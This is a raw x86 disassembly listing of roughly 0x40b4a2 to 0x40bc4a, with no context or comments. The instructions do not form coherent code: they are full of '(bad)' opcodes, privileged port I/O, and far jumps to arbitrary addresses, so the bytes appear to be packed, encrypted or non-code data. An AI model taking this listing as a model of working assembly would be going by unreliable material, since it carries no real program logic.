  40b4a2:	pop    ebx
  40b4a3:	mov    ds:0xf015e473,al
  40b4a8:	sbb    al,0x21
  40b4aa:	inc    esi
  40b4ab:	test   DWORD PTR [ebx+0x1a],ebp
  40b4ae:	sbb    al,0x1c
  40b4b0:	pop    ebx
  40b4b1:	cmp    eax,0x3babdc7b
  40b4b6:	mov    esi,0x82aac14e
  40b4bb:	fld    QWORD PTR [edi]
  40b4bd:	adc    ah,bl
  40b4bf:	std    
  40b4c0:	les    edi,FWORD PTR [esi]
  40b4c2:	and    BYTE PTR [edi-0x70],bl
  40b4c5:	int3   
  40b4c6:	add    esp,esi
  40b4c8:	ja     0x40b506
  40b4ca:	call   0xe662:0xa5f4838
  40b4d1:	scas   al,BYTE PTR es:[edi]
  40b4d2:	or     ch,al
  40b4d4:	test   BYTE PTR [edi+0x3e],ah
  40b4d7:	int3   
  40b4d8:	mov    ds:0xc11d72f7,al
  40b4dd:	in     al,0x43
  40b4df:	xor    eax,0x641ad8e3
  40b4e4:	push   cs
  40b4e5:	inc    ax
  40b4e7:	outs   dx,BYTE PTR ds:[esi]
  40b4e8:	push   esp
  40b4e9:	and    eax,0xeb71c8e
  40b4ee:	outs   dx,BYTE PTR ds:[esi]
  40b4ef:	ret    0xd2cd
  40b4f2:	out    0x27,eax
  40b4f4:	pop    es
  40b4f5:	push   edx
  40b4f6:	call   0x32201ad1
  40b4fb:	or     al,0xcf
  40b4fd:	(bad)  
  40b4fe:	cdq    
  40b4ff:	jne    0x40b54f
  40b501:	sbb    DWORD PTR [ebx+0x69a9c061],ebx
  40b507:	xchg   esi,eax
  40b508:	sbb    al,0x10
  40b50a:	push   edx
  40b50b:	retf   
  40b50c:	test   DWORD PTR [eax+0x4e],eax
  40b50f:	retf   
  40b510:	xchg   DWORD PTR [ebp+ebx*2-0x38],edx
  40b514:	loop   0x40b554
  40b516:	sub    al,0x93
  40b518:	mov    bh,0xa7
  40b51a:	sub    BYTE PTR [edx+0x5ab1ab85],dl
  40b520:	push   cs
  40b521:	sar    BYTE PTR ds:[ecx-0x2b],1
  40b525:	pop    ebx
  40b526:	add    edi,DWORD PTR [esi]
  40b528:	pop    ebp
  40b529:	push   ebx
  40b52a:	push   ss
  40b52b:	imul   edi,eax,0xffffff82
  40b52e:	pop    esi
  40b52f:	and    ah,BYTE PTR [esi-0x46b95eaf]
  40b535:	push   ecx
  40b536:	jno    0x40b543
  40b538:	inc    edx
  40b539:	pushf  
  40b53a:	rol    BYTE PTR [eax-0x26d07ec6],cl
  40b540:	lods   eax,DWORD PTR ds:[esi]
  40b541:	or     DWORD PTR ds:0x9ed5a3c2,0xffffff9d
  40b548:	and    esi,DWORD PTR [eax]
  40b54a:	enter  0x2643,0xc6
  40b54e:	mov    cx,0x66e5
  40b552:	pop    ss
  40b553:	test   al,0x41
  40b555:	inc    ebx
  40b556:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b557:	lods   al,BYTE PTR ds:[esi]
  40b558:	cld    
  40b559:	test   BYTE PTR [ebp+0x55],ah
  40b55c:	push   ecx
  40b55d:	push   edi
  40b55e:	adc    bh,BYTE PTR [edi-0x30]
  40b561:	test   al,0x71
  40b563:	and    ebx,DWORD PTR [edi+0x7f3ec160]
  40b569:	mov    dh,BYTE PTR [edi+eax*8-0x3b]
  40b56d:	jmp    0x245b:0xf933d0a4
  40b574:	adc    BYTE PTR [ebp+0x1b3a4306],ah
  40b57a:	stos   BYTE PTR es:[edi],al
  40b57b:	lahf   
  40b57c:	add    DWORD PTR [ecx+0x51],edi
  40b57f:	fidiv  DWORD PTR [ecx-0x644348c3]
  40b585:	idiv   edi
  40b587:	int    0x6d
  40b589:	loop   0x40b548
  40b58b:	mov    edx,0x76426c26
  40b590:	jne    0x40b5bb
  40b592:	xchg   esp,eax
  40b593:	mov    dl,BYTE PTR [ebx]
  40b595:	mov    BYTE PTR [ebp+0xdbdb9fa],dl
  40b59b:	test   al,0x97
  40b59d:	xor    esi,DWORD PTR [eax]
  40b59f:	add    dh,BYTE PTR [esi]
  40b5a1:	pop    ss
  40b5a2:	repnz fs xchg esp,eax
  40b5a5:	aad    0x58
  40b5a7:	dec    eax
  40b5a8:	and    esp,DWORD PTR [ebx+edi*2-0x52e10f45]
  40b5af:	dec    eax
  40b5b0:	inc    edi
  40b5b1:	add    al,0x68
  40b5b3:	or     ecx,ecx
  40b5b5:	adc    DWORD PTR [esi-0x34409720],ebx
  40b5bb:	test   BYTE PTR [esi+0x46],bl
  40b5be:	push   ss
  40b5bf:	cmp    BYTE PTR [ecx+0x75],bh
  40b5c2:	pop    ds
  40b5c3:	pop    esi
  40b5c4:	jbe    0x40b5b5
  40b5c6:	mov    eax,0x18b6cea4
  40b5cb:	rol    DWORD PTR [eax-0x18],0x70
  40b5cf:	xlat   BYTE PTR ds:[ebx]
  40b5d0:	mov    eax,DWORD PTR [edi-0x7e41ea3d]
  40b5d6:	sub    dl,BYTE PTR [edx-0x2e228765]
  40b5dc:	popf   
  40b5dd:	js     0x40b62b
  40b5df:	loop   0x40b5e2
  40b5e1:	call   0x4a8c:0xe5bf4286
  40b5e8:	in     al,0x63
  40b5ea:	sti    
  40b5eb:	jnp    0x40b667
  40b5ed:	ja     0x40b5cc
  40b5ef:	push   edx
  40b5f0:	mov    DWORD PTR [ebp+0x47],0xe33ff3b6
  40b5f7:	imul   esp,DWORD PTR [edx-0x456e1f7e],0x737682b7
  40b601:	sti    
  40b602:	mov    esp,DWORD PTR [esi+0x4a]
  40b605:	jno    0x40b670
  40b607:	addr16 pushf 
  40b609:	cmp    ch,0x6a
  40b60c:	mov    dh,0xec
  40b60e:	mov    BYTE PTR [ebx],0x5d
  40b611:	loopne 0x40b61f
  40b613:	and    DWORD PTR [edx+edi*8+0x47],0x20
  40b618:	jnp    0x40b61e
  40b61a:	adc    eax,0x51cbc261
  40b61f:	ins    DWORD PTR es:[edi],dx
  40b620:	jbe    0x40b62c
  40b622:	test   eax,0x583500f7
  40b627:	jae    0x40b6a2
  40b629:	scas   al,BYTE PTR es:[edi]
  40b62a:	adc    al,BYTE PTR [edi-0x391b807a]
  40b630:	mov    esi,0xdf7ce824
  40b635:	xchg   ecx,eax
  40b636:	sbb    cl,bl
  40b638:	sbb    bl,cl
  40b63a:	imul   ecx,DWORD PTR [ebp+0x21],0x172874f5
  40b641:	jle    0x40b5ff
  40b643:	pop    esi
  40b644:	sub    BYTE PTR [ebp-0xa],ah
  40b647:	push   ecx
  40b648:	dec    ebx
  40b649:	out    0xda,al
  40b64b:	inc    esp
  40b64c:	mov    DWORD PTR [eax],edi
  40b64e:	cmp    esp,DWORD PTR [eax-0x43b0c046]
  40b654:	cld    
  40b655:	div    DWORD PTR [ecx]
  40b657:	sahf   
  40b658:	mov    dl,0x6a
  40b65a:	stos   DWORD PTR es:[edi],eax
  40b65b:	out    0x2b,eax
  40b65d:	mov    ecx,0x4b734865
  40b662:	mov    BYTE PTR [edx+0x33698529],ah
  40b668:	into   
  40b669:	and    cl,BYTE PTR [eax+esi*1]
  40b66c:	sub    ebx,DWORD PTR [ecx+0x4d4ac98b]
  40b672:	push   esi
  40b673:	retf   
  40b674:	idiv   DWORD PTR ds:0xa244a08c
  40b67a:	dec    edx
  40b67b:	push   esp
  40b67c:	imul   esi,DWORD PTR [esi-0x6e],0xe140cd26
  40b683:	add    ebx,DWORD PTR [edx-0x1b]
  40b686:	leave  
  40b687:	mov    bl,0x4b
  40b689:	(bad)  [esp+esi*1+0x48a354dd]
  40b690:	repz test BYTE PTR [eax+0x5b],bh
  40b694:	sbb    eax,0x495010f1
  40b699:	ror    ebp,1
  40b69b:	pop    esp
  40b69c:	ss push 0xffffffad
  40b69f:	adc    DWORD PTR [eax+0x76df5f40],edx
  40b6a5:	test   eax,0xc885af1c
  40b6aa:	pop    esp
  40b6ab:	sub    BYTE PTR [eax],al
  40b6ad:	add    eax,0x3eba204
  40b6b2:	inc    ebx
  40b6b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6b4:	shr    BYTE PTR [eax+0x6],1
  40b6b7:	dec    ebx
  40b6b8:	jno    0x40b6b7
  40b6ba:	sbb    BYTE PTR [ebx+0x1e],bh
  40b6bd:	retf   0x3346
  40b6c0:	test   ch,ah
  40b6c2:	mov    ds:0x2a7711b2,eax
  40b6c7:	push   es
  40b6c8:	repnz test DWORD PTR ss:[edi+0x48],0x2393377
  40b6d1:	mov    bh,0x44
  40b6d3:	call   0xd3117d4d
  40b6d8:	call   0x7d28944a
  40b6dd:	fcmovne st,st(7)
  40b6df:	mov    ds:0xb1194a08,eax
  40b6e4:	popa   
  40b6e5:	jecxz  0x40b722
  40b6e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6e8:	fcom   QWORD PTR [eax+eiz*2-0x21b1d4bc]
  40b6ef:	std    
  40b6f0:	pusha  
  40b6f1:	push   edx
  40b6f2:	inc    edx
  40b6f3:	cmp    DWORD PTR [eax+0x4a],esp
  40b6f6:	imul   edx,DWORD PTR [edx+0x54],0x789e7d2b
  40b6fd:	or     eax,0x94b826d3
  40b702:	mov    bh,0xe0
  40b704:	lahf   
  40b705:	(bad)
  40b709:	push   ebx
  40b70a:	cmp    ebx,edi
  40b70c:	out    dx,eax
  40b70d:	pusha  
  40b70e:	aam    0xd5
  40b710:	jns    0x40b701
  40b712:	mov    dl,0x8f
  40b714:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b715:	rcl    DWORD PTR [edx],0x51
  40b718:	aas    
  40b719:	pushf  
  40b71a:	out    0x3,eax
  40b71c:	or     ebx,DWORD PTR [ebx]
  40b71e:	push   edx
  40b71f:	inc    eax
  40b720:	jnp    0x40b761
  40b722:	push   ss
  40b723:	jmp    0x6dd4:0xf9a1c354
  40b72a:	inc    edi
  40b72b:	repnz xlat BYTE PTR ds:[ebx]
  40b72d:	dec    esp
  40b72e:	jo     0x40b6bc
  40b730:	adc    al,0x5d
  40b732:	pop    ebx
  40b733:	mov    dh,0xec
  40b735:	lods   eax,DWORD PTR ds:[esi]
  40b736:	retf   0x27ee
  40b739:	xchg   ah,al
  40b73b:	pushw  cs
  40b73d:	hlt    
  40b73e:	pop    esi
  40b73f:	pop    ecx
  40b740:	shl    DWORD PTR [ebp+edi*8-0x1f],1
  40b744:	jmp    0x40b6c8
  40b746:	lods   eax,DWORD PTR ds:[esi]
  40b747:	jno    0x40b7c5
  40b749:	or     DWORD PTR [edx+0x4c37373a],esp
  40b74f:	cwde   
  40b750:	mov    WORD PTR [ebx],ds
  40b752:	pop    esi
  40b753:	adc    ecx,ebx
  40b755:	adc    ebx,DWORD PTR [ecx-0x1a71998a]
  40b75b:	dec    ecx
  40b75c:	das    
  40b75d:	adc    BYTE PTR [ecx+0x44ec9973],al
  40b763:	stos   DWORD PTR es:[edi],eax
  40b764:	int    0xd6
  40b766:	and    al,0x1b
  40b768:	jmp    0x40b718
  40b76a:	xchg   edx,eax
  40b76b:	mov    WORD PTR [edx+eax*8],cs
  40b76e:	push   eax
  40b76f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b770:	pop    esi
  40b771:	inc    ebx
  40b772:	jne    0x40b6fc
  40b774:	cmp    BYTE PTR [edx+0x5c],ch
  40b777:	mov    dh,0x77
  40b779:	test   al,ch
  40b77b:	inc    eax
  40b77c:	pushf  
  40b77d:	and    eax,DWORD PTR [ebp-0x2ebe5082]
  40b783:	jmp    0x92a41491
  40b788:	addr16 ja 0x40b75b
  40b78b:	into   
  40b78c:	aam    0x2
  40b78e:	aaa    
  40b78f:	test   al,0xb
  40b791:	or     esp,DWORD PTR [edi+0x42e999a6]
  40b797:	std    
  40b798:	aaa    
  40b799:	push   eax
  40b79b:	cmp    al,0x50
  40b79d:	and    BYTE PTR [eax+0x6c],al
  40b7a0:	pusha  
  40b7a1:	xchg   esi,eax
  40b7a2:	mov    bl,0x1d
  40b7a4:	cmp    edi,DWORD PTR [ecx-0x6f0e1c52]
  40b7aa:	mov    ebx,0x92098098
  40b7af:	ret    
  40b7b0:	push   cs
  40b7b1:	shr    BYTE PTR [edi],1
  40b7b3:	aaa    
  40b7b4:	cmp    eax,0x826107bb
  40b7b9:	mov    ebp,0x8e1355df
  40b7be:	test   al,0x77
  40b7c0:	add    dl,dh
  40b7c2:	std    
  40b7c3:	inc    esp
  40b7c4:	mov    edx,0x65fe5e95
  40b7c9:	inc    ebp
  40b7ca:	enter  0xdd54,0x30
  40b7ce:	inc    esp
  40b7cf:	scas   al,BYTE PTR es:[edi]
  40b7d0:	add    al,0x39
  40b7d2:	inc    ebp
  40b7d3:	push   cs
  40b7d4:	add    eax,0xcdc38f90
  40b7d9:	mov    al,0x9a
  40b7db:	stos   DWORD PTR es:[edi],eax
  40b7dc:	mov    esi,0xbc19ca31
  40b7e1:	push   edx
  40b7e2:	bound  esi,QWORD PTR [edi-0x6e891935]
  40b7e8:	fnsave [ebx+ecx*2-0x43]
  40b7ec:	loopne 0x40b777
  40b7ee:	pop    ds
  40b7ef:	mov    ds:0x80e2fd18,al
  40b7f4:	in     al,0xe9
  40b7f6:	cld    
  40b7f7:	adc    eax,0x6bfbb6b7
  40b7fc:	test   BYTE PTR [ebx],bh
  40b7fe:	daa    
  40b7ff:	fsubr  DWORD PTR [eax]
  40b801:	mov    ebx,0xaf97ac38
  40b806:	ja     0x40b887
  40b808:	add    ch,ch
  40b80a:	fcomp  QWORD PTR [edi+eax*8+0x39]
  40b80e:	call   0xbcf5:0xef5f58a0
  40b815:	add    al,BYTE PTR [ebx]
  40b817:	lds    ebx,FWORD PTR [esi]
  40b819:	or     eax,0x65e01cd3
  40b81e:	jns    0x40b7f2
  40b820:	fs jg  0x40b889
  40b823:	int    0x8a
  40b825:	and    BYTE PTR [eax],0xcc
  40b828:	fimul  DWORD PTR [eax+ebx*1]
  40b82b:	arpl   si,cx
  40b82d:	mov    ebp,0x2dddc371
  40b832:	push   es
  40b833:	inc    esi
  40b834:	push   cs
  40b835:	cwde   
  40b836:	adc    BYTE PTR [ebp-0x60],bh
  40b839:	stos   BYTE PTR es:[edi],al
  40b83a:	and    eax,0xfe9dbbc0
  40b83f:	cmp    al,0xad
  40b841:	leave  
  40b842:	div    DWORD PTR ds:0x2534533a
  40b848:	sahf   
  40b849:	fstp   DWORD PTR [edx+0x54bacb02]
  40b84f:	jae    0x40b86d
  40b851:	fwait
  40b852:	mov    edi,0x32f57ea3
  40b857:	pop    es
  40b858:	(bad)  
  40b859:	les    eax,FWORD PTR [edx+eiz*1]
  40b85c:	inc    esp
  40b85d:	pop    edx
  40b85e:	ret    
  40b85f:	and    BYTE PTR [edi+0x1f5ae69c],bh
  40b865:	test   eax,0x4c62d254
  40b86a:	jecxz  0x40b819
  40b86c:	ds xchg ebx,eax
  40b86e:	xchg   ecx,eax
  40b86f:	out    0xe0,al
  40b871:	sub    edi,DWORD PTR [ebx]
  40b873:	xor    BYTE PTR [esp+ebx*1+0x1b9b463b],dh
  40b87a:	jmp    0x24c05562
  40b87f:	test   BYTE PTR [esi+0xa78a466],0x92
  40b886:	mov    ds:0xa2cc864f,eax
  40b88b:	lods   al,BYTE PTR ds:[esi]
  40b88c:	es into 
  40b88e:	aad    0x8c
  40b890:	dec    ebx
  40b891:	push   ecx
  40b892:	ficom  DWORD PTR [esi+0x18338170]
  40b898:	fdivr  st(6),st
  40b89a:	in     eax,0xc2
  40b89c:	jnp    0x40b90f
  40b89e:	leave  
  40b89f:	push   ebp
  40b8a0:	inc    ebx
  40b8a1:	inc    esi
  40b8a2:	pop    ecx
  40b8a3:	aad    0x26
  40b8a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8a6:	xor    BYTE PTR [esi],0xd5
  40b8a9:	and    eax,0x40a0d68d
  40b8ae:	push   eax
  40b8af:	cdq    
  40b8b0:	mov    edi,0x4109d301
  40b8b5:	les    esp,FWORD PTR [esi-0x22fd5399]
  40b8bb:	mov    bh,BYTE PTR [ebp+0x3ba2fece]
  40b8c1:	shr    BYTE PTR [ebx+0x2f96b83e],1
  40b8c7:	mov    DWORD PTR [ebx+edx*2+0x5c660fc],ebp
  40b8ce:	push   0x27ef2975
  40b8d3:	aam    0x50
  40b8d5:	jns    0x40b92d
  40b8d7:	jecxz  0x40b880
  40b8d9:	dec    edx
  40b8da:	push   cs
  40b8db:	mov    ecx,0xb40c49f2
  40b8e0:	sub    BYTE PTR fs:0x8f9ace12,al
  40b8e7:	ror    BYTE PTR [esi-0x64778642],1
  40b8ed:	inc    eax
  40b8ee:	mov    ds:0xf5d3df95,eax
  40b8f3:	push   esp
  40b8f4:	cwde   
  40b8f5:	mov    ds:0x4e2b2cb,eax
  40b8fa:	adc    BYTE PTR [ebp*2-0x38d0db61],0x5e
  40b902:	(bad)  
  40b903:	outs   dx,DWORD PTR ds:[esi]
  40b904:	inc    esp
  40b905:	in     eax,0x89
  40b907:	fisub  DWORD PTR [ebp-0x1d0a52fb]
  40b90d:	ficomp DWORD PTR [esi-0x35]
  40b910:	jge    0x40b8fc
  40b912:	(bad)  
  40b913:	outs   dx,BYTE PTR ds:[esi]
  40b914:	stc    
  40b915:	sub    eax,0x99996e45
  40b91a:	in     eax,dx
  40b91b:	div    BYTE PTR [edi-0x6ac1b731]
  40b921:	mov    ch,0x20
  40b923:	dec    esp
  40b924:	mov    al,ds:0x53e3e0f
  40b929:	jnp    0x40b914
  40b92b:	jecxz  0x40b941
  40b92d:	lock lds ebp,FWORD PTR [edx]
  40b930:	repz mov esi,0xa172421b
  40b936:	dec    edi
  40b937:	cld    
  40b938:	aas    
  40b939:	fs stos DWORD PTR es:[edi],eax
  40b93b:	int    0x11
  40b93d:	mov    ah,0x23
  40b93f:	in     eax,0xdb
  40b941:	mov    bh,0xc3
  40b943:	xchg   esp,eax
  40b944:	cwde   
  40b945:	pop    es
  40b946:	lods   eax,DWORD PTR ds:[esi]
  40b947:	adc    al,0xf1
  40b949:	and    ebx,DWORD PTR [ecx-0x5dcbfbdd]
  40b94f:	jne    0x40b954
  40b951:	neg    DWORD PTR [edi-0x16d10ff3]
  40b957:	(bad)  
  40b958:	int    0xeb
  40b95a:	test   DWORD PTR [esi+0xb],0x5f387e00
  40b961:	xchg   ecx,eax
  40b962:	sub    eax,0x27e89d23
  40b967:	jmp    0xd9a8:0xa54893c
  40b96e:	inc    ebp
  40b970:	push   ds
  40b971:	rcl    DWORD PTR ss:[edx],0xbf
  40b975:	mov    DWORD PTR [ebx+0x16552861],edx
  40b97b:	out    0x42,al
  40b97d:	ror    BYTE PTR [eax+0x5151741d],1
  40b983:	leave  
  40b984:	inc    ebp
  40b985:	in     eax,dx
  40b986:	out    dx,al
  40b987:	es push esi
  40b989:	mov    esi,0x2d16fdd9
  40b98e:	sahf   
  40b98f:	mov    edi,0x7c02d96a
  40b994:	inc    ebx
  40b995:	adc    al,0x82
  40b997:	popa   
  40b998:	xor    ch,0x89
  40b99b:	je     0x40b938
  40b99d:	rcr    DWORD PTR [ebp-0x584c54d2],cl
  40b9a3:	add    bl,ah
  40b9a5:	pop    edx
  40b9a6:	enter  0x3a4a,0xb1
  40b9aa:	push   0x7
  40b9ac:	cmc    
  40b9ad:	or     ah,BYTE PTR [ebx+0x55]
  40b9b0:	mov    ecx,0xfea91e41
  40b9b5:	retf   
  40b9b6:	(bad)  
  40b9b7:	jle    0x40b9de
  40b9b9:	inc    edi
  40b9ba:	(bad)  
  40b9bc:	or     DWORD PTR [ebx-0x10],eax
  40b9bf:	jae    0x40ba2a
  40b9c1:	aaa    
  40b9c2:	xor    bl,BYTE PTR [ebx]
  40b9c4:	jl     0x40b95e
  40b9c6:	mov    DWORD PTR [esi+0x0],ecx
  40b9c9:	fbld   TBYTE PTR [esi+0x2fcb0b1c]
  40b9cf:	dec    esp
  40b9d0:	loop   0x40b9aa
  40b9d2:	iret   
  40b9d3:	sbb    BYTE PTR [eax+0x45fa05d],bl
  40b9d9:	push   edi
  40b9da:	and    dl,BYTE PTR [ebx+ebx*1-0x14]
  40b9de:	jnp    0x40ba5e
  40b9e0:	call   0x1c508dd9
  40b9e5:	shl    DWORD PTR [edi],cl
  40b9e7:	jg     0x40ba16
  40b9e9:	and    edi,DWORD PTR [ecx+0x6f]
  40b9ec:	jae    0x40b983
  40b9ee:	imul   edx,DWORD PTR [ebp+0x64d26415],0x29
  40b9f5:	in     al,dx
  40b9f6:	mov    al,0xb5
  40b9f8:	xor    dl,BYTE PTR [esi]
  40b9fa:	mov    dh,0xb1
  40b9fc:	repz mov esp,0xc850ea80
  40ba02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba03:	push   0x62f01fb4
  40ba08:	aaa    
  40ba09:	add    BYTE PTR es:[edx+esi*1-0x32],dl
  40ba0e:	xor    BYTE PTR [edx+0x79],cl
  40ba11:	ins    DWORD PTR es:[edi],dx
  40ba12:	hlt    
  40ba13:	in     eax,0x15
  40ba15:	jae    0x40b9d3
  40ba17:	jle    0x40ba09
  40ba19:	aaa    
  40ba1a:	xchg   BYTE PTR [ecx+0x224e300e],ch
  40ba20:	jno    0x40b9f8
  40ba22:	xor    al,0x9e
  40ba24:	pop    ecx
  40ba25:	lahf   
  40ba26:	out    0x8b,al
  40ba28:	aas    
  40ba29:	pop    edi
  40ba2a:	push   ss
  40ba2b:	cs rol DWORD PTR gs:[eax-0x2d5fa079],0xd0
  40ba34:	bound  esp,QWORD PTR [eax-0x6f]
  40ba37:	arpl   WORD PTR [edi+0x386395ff],ax
  40ba3d:	push   ss
  40ba3e:	add    al,0x9f
  40ba40:	inc    ebx
  40ba41:	shl    BYTE PTR [esi],1
  40ba43:	xor    eax,0x10337b70
  40ba48:	hlt    
  40ba49:	test   BYTE PTR [ebp+0x12],cl
  40ba4c:	popf   
  40ba4d:	jmp    0x1c62:0x5c8026ff
  40ba54:	fcom   DWORD PTR [bx+0x8]
  40ba58:	sub    eax,0xdcf0d236
  40ba5d:	es or  cl,ah
  40ba60:	inc    esi
  40ba61:	jbe    0x40ba8b
  40ba63:	sub    eax,0xb757e67e
  40ba68:	sar    ch,cl
  40ba6a:	sahf   
  40ba6b:	dec    BYTE PTR [esp+esi*8+0xc]
  40ba6f:	dec    ebp
  40ba70:	inc    ebp
  40ba71:	and    eax,0x45b7bad0
  40ba76:	icebp  
  40ba77:	sbb    eax,0x3720c07f
  40ba7c:	lahf   
  40ba7d:	dec    esp
  40ba7e:	inc    eax
  40ba7f:	sub    eax,0x228c39b8
  40ba84:	and    al,0x81
  40ba86:	mov    al,ds:0x99806936
  40ba8b:	push   0xfef4713b
  40ba90:	pop    es
  40ba91:	jo     0x40bb10
  40ba93:	js     0x40ba98
  40ba95:	ins    BYTE PTR es:[edi],dx
  40ba96:	fbld   TBYTE PTR [ecx-0x3ad49fcd]
  40ba9c:	jg     0x40ba65
  40ba9e:	imul   eax,DWORD PTR [edi+eax*8],0x11
  40baa2:	dec    esp
  40baa3:	call   0x6a5521f3
  40baa8:	sub    eax,0x76936b7a
  40baad:	cli    
  40baae:	das    
  40baaf:	cwde   
  40bab0:	cmp    dh,BYTE PTR [ebx+esi*4]
  40bab3:	retf   
  40bab4:	fnstsw WORD PTR [edi]
  40bab6:	mov    edi,0xec63c40f
  40babb:	inc    esi
  40babc:	mov    ebx,0xc45c5c8
  40bac1:	push   0x38
  40bac3:	in     al,0xa0
  40bac5:	sub    DWORD PTR [esi+0x5b],0xc919e451
  40bacc:	xchg   ebp,eax
  40bacd:	imul   eax,DWORD PTR [edi+0x21],0xffffffaa
  40bad1:	ret    
  40bad2:	loop   0x40bad1
  40bad4:	push   esp
  40bad5:	pop    ebp
  40bad6:	jmp    0x40ba78
  40bad8:	mov    WORD PTR [edi],ds
  40bada:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40badb:	dec    ebx
  40badc:	les    esp,FWORD PTR [ebp-0x30]
  40badf:	mov    edx,0x36d69aae
  40bae4:	das    
  40bae5:	inc    ebp
  40bae6:	jmp    0x4f51:0x49d24705
  40baed:	inc    esp
  40baee:	sbb    al,0x1b
  40baf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40baf1:	add    BYTE PTR [esi],ah
  40baf3:	add    al,0x1f
  40baf5:	jg     0x40baaa
  40baf7:	retf   0xdf0c
  40bafa:	mov    bl,0x89
  40bafc:	jo     0x40bb50
  40bafe:	sbb    ch,bl
  40bb00:	stc    
  40bb01:	dec    ecx
  40bb02:	aaa    
  40bb03:	dec    edx
  40bb04:	push   edi
  40bb05:	in     al,dx
  40bb06:	jae    0x40bb18
  40bb08:	cdq    
  40bb09:	dec    esi
  40bb0a:	fistp  QWORD PTR [edi+0x4]
  40bb0d:	iret   
  40bb0e:	stos   BYTE PTR es:[edi],al
  40bb0f:	jmp    0x569a3358
  40bb14:	pop    ebp
  40bb15:	xor    ebp,DWORD PTR [ebp+0x7eb4d586]
  40bb1b:	inc    ecx
  40bb1c:	int3   
  40bb1d:	mov    ah,0x36
  40bb1f:	adc    BYTE PTR [eax+0x3f],bh
  40bb22:	sahf   
  40bb23:	(bad)  
  40bb24:	out    dx,al
  40bb25:	loopne 0x40bb88
  40bb27:	xchg   esi,eax
  40bb28:	mov    ch,0x35
  40bb2a:	pop    ebp
  40bb2b:	mov    DWORD PTR [ebx+0x124128fd],0xa5737a1e
  40bb35:	addr16 xor eax,0xebeabb13
  40bb3b:	push   ds
  40bb3c:	mov    ebx,0x19af9965
  40bb41:	and    edi,DWORD PTR [edi-0x55684b9a]
  40bb47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb48:	jmp    0x5f4:0x5c221fa9
  40bb4f:	rol    BYTE PTR [edx],cl
  40bb51:	test   BYTE PTR [edi-0x5d],ch
  40bb54:	mov    bh,0x42
  40bb56:	xchg   edi,eax
  40bb57:	popa   
  40bb58:	arpl   WORD PTR [ecx+0x58c2aad5],di
  40bb5e:	pop    ebp
  40bb5f:	js     0x40bb9c
  40bb61:	int    0x7f
  40bb63:	ret    
  40bb64:	cmc    
  40bb65:	fiadd  DWORD PTR [eax]
  40bb67:	xor    ebp,ebp
  40bb69:	push   ebp
  40bb6a:	lahf   
  40bb6b:	ror    esp,cl
  40bb6d:	lds    ebx,FWORD PTR [ebx+0x12]
  40bb70:	mov    DWORD PTR [esi],eax
  40bb72:	adc    al,0x5c
  40bb74:	daa    
  40bb75:	cmp    BYTE PTR [bx+0x84a],bh
  40bb7a:	iret   
  40bb7b:	jae    0x40bb40
  40bb7d:	(bad)  
  40bb7f:	ds out 0xb4,al
  40bb82:	mov    DWORD PTR [edi-0x3ee6fc0c],ebp
  40bb88:	fldenv [edx+eax*4]
  40bb8b:	fld    TBYTE PTR [ebp+0x782bc8f0]
  40bb91:	xlat   BYTE PTR ds:[ebx]
  40bb92:	in     eax,dx
  40bb93:	mov    BYTE PTR [esi-0x4a53e13d],dh
  40bb99:	mov    ebx,0xcc6d862e
  40bb9e:	jp     0x40bbbf
  40bba0:	ja     0x40bb9d
  40bba2:	or     al,BYTE PTR [ecx-0x24]
  40bba5:	bndstx [edx-0x78],(bad)
  40bba9:	pop    DWORD PTR [esi]
  40bbab:	and    cl,BYTE PTR [esi+0x1668cfd1]
  40bbb1:	pusha  
  40bbb2:	inc    eax
  40bbb3:	cmp    eax,0xfc5434eb
  40bbb8:	fwait
  40bbb9:	mov    ebx,0xf0f7ed51
  40bbbe:	fbld   TBYTE PTR [edx-0x37369d93]
  40bbc4:	int3   
  40bbc5:	in     al,0xe7
  40bbc7:	push   esi
  40bbc8:	aaa    
  40bbc9:	push   ss
  40bbca:	out    0xf8,eax
  40bbcc:	in     eax,dx
  40bbcd:	push   ecx
  40bbce:	sbb    ch,bl
  40bbd0:	mov    bl,0xa9
  40bbd2:	ror    DWORD PTR [esi],1
  40bbd4:	mov    ebx,0x4bf15b8
  40bbd9:	aaa    
  40bbda:	ins    DWORD PTR es:[edi],dx
  40bbdb:	in     al,dx
  40bbdc:	aad    0xc4
  40bbde:	mov    ds:0x7e0eed8a,al
  40bbe3:	fwait
  40bbe4:	fwait
  40bbe5:	sub    BYTE PTR [ebx],dh
  40bbe7:	pop    eax
  40bbe8:	cs and eax,0x3d881b2f
  40bbee:	retf   0xa01b
  40bbf1:	mov    cl,0xf7
  40bbf3:	mov    esi,0x2cee820b
  40bbf8:	(bad)  
  40bbfa:	inc    edi
  40bbfb:	push   esi
  40bbfc:	inc    esi
  40bbfd:	inc    ebx
  40bbfe:	and    DWORD PTR [edi+0x100d92a6],ecx
  40bc04:	in     al,dx
  40bc05:	cmp    dl,BYTE PTR [esi+0x5f]
  40bc08:	cs pop ebx
  40bc0a:	sbb    DWORD PTR [ebp-0x21],esi
  40bc0d:	jle    0x40bb9f
  40bc0f:	icebp  
  40bc10:	cmp    ah,BYTE PTR [eax-0x57c79551]
  40bc16:	and    ah,BYTE PTR [esi]
  40bc18:	cmp    DWORD PTR [eax],ecx
  40bc1a:	neg    ch
  40bc1c:	mov    dl,0xec
  40bc1e:	std    
  40bc1f:	out    0xb3,eax
  40bc21:	mov    ecx,0x79f5083e
  40bc26:	(bad)  
  40bc27:	lock ja 0x40bc8b
  40bc2a:	std    
  40bc2b:	neg    BYTE PTR gs:[edi-0xc704b92]
  40bc32:	out    dx,al
  40bc33:	cmp    ecx,eax
  40bc35:	lock stos DWORD PTR es:[edi],eax
  40bc37:	adc    edx,DWORD PTR [edx]
  40bc39:	cwde   
  40bc3a:	retf   0xa3df
  40bc3d:	inc    ecx
  40bc3e:	dec    edx
  40bc3f:	add    BYTE PTR [ebp-0x303f262e],bh
  40bc45:	mov    eax,0x5a5f484a
  40bc4a:	not    ebp
